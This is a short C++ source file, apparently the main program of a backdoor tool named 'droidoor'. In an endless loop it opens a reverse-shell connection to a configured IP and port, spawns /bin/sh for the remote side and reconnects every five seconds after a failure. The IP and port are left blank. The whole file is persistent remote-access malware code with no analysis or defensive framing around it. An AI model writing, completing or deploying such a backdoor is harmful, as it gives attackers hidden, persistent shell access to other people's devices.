#include "src/droidoor/rshell.hpp"
#include <string>
#include <cstdint>
#include <iostream>
#include <unistd.h>

int main(){
    std::string ip = "";
    uint16_t port = 0;
    while (true) {
        try {
        droidoor::ReverseShell rshell(ip, port);
            rshell.setup_connect();
            rshell.spawn_shell(std::string("/bin/sh"));

        } catch (const std::exception& e){
            std::cerr << "Failed to commit: " << e.what() << std::endl;
        }
        sleep(5);

    }
    return 0;
}